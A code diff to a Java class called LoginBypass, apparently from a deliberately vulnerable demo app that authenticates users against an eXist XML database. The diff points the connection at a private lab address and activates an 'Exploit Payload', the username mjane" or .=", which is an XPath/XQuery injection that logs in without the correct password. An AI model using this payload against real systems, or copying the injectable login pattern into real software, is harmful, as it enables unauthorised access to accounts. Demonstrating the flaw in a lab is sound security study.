@@ -9,7 +9,7 @@ import java.util.regex.Pattern;
 
 public class LoginBypass {
     protected static String DRIVER = "org.exist.xmldb.DatabaseImpl";
-    protected static String URI = "xmldb:exist://13.70.19.195:8080/exist/xmlrpc";
+    protected static String URI = "xmldb:exist://192.168.10.130:8080/exist/xmlrpc";
     protected static String collectionPath = "/db/vulnapp/";
     protected static String resourceName = "user.xml";
     public static Collection col = null;
@@ -33,10 +33,10 @@ public class LoginBypass {
         //Normal Username
         String username = "mjane";
         //Exploit Payload
-        //username = "mjane\" or .=\"";
-        String password = "randompassword>";
+        username = "mjane\" or .=\"";
+        String password = "wrongpassword";
 
-        if (login_validate(username, password))
+        if (login(username, password))
             System.out.println("Login Success");
         else
             System.out.println("Login Failed");
